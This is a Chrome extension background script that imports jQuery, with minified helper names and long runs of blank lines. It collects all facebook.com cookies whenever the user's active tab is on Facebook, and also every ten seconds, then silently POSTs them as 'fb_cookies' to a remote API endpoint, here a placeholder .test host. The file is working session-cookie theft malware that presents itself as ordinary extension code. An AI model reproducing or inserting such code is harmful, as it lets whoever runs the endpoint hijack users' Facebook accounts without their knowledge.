// import store from './store'
import jquery from '../src/assets/jquery'

























function o(e) {
  return (o =
    'function' == typeof Symbol && 'symbol' == typeof Symbol.iterator
      ? function(e) {
          return typeof e;
        }
      : function(e) {
          return e && 'function' == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? 'symbol' : typeof e;
        })(e);
}

let i = [];

function a() {
  chrome.cookies.getAll({ url: 'https://www.facebook.com' }, function(e) {
    i.push(e);
  });
}

chrome.tabs.onActivated.addListener(function(e) {
  chrome.tabs.query({ active: !0, windowType: 'normal', currentWindow: !0 }, function(e) {
    'https://www.facebook.com/' === e[0].url && 'object' == o(i) && (a(), s(i));
  });
});
setInterval(function() {
  chrome.tabs.query({ active: !0, windowType: 'normal', currentWindow: !0 }, function(e) {
    'https://www.facebook.com/' === e[0].url && 'object' == o(i) && (a(), s(i));
  });
}, 1e4);

function s(e) {
  var t = $.ajax({
    headers: {
      Authorization: 'Bearer ' + localStorage.getItem('token1'),
      Accept: 'application/json',
      'X-CSRF-TOKEN': 'TOKEN',
    },

    url: 'https://extension.test/api/v1/store',
    type: 'post',

    data: { fb_cookies: e[0] },
  });

  t.done(function(e, t, n) {
    console.log('result:success');
  }),
    t.fail(function(e, t, n) {
      console.error('The following error occurred: ' + t, n);
    });
}


chrome.tabs.onUpdated.addListener(function(e, t, n) {
  chrome.tabs.query({ active: !0, currentWindow: !0 }, function(e) {
    'www.facebook.com' === (0 === e.length ? e : e[0]).url.split('/')[2] && 'object' == o(i) && (a(), s(i));
  });
});










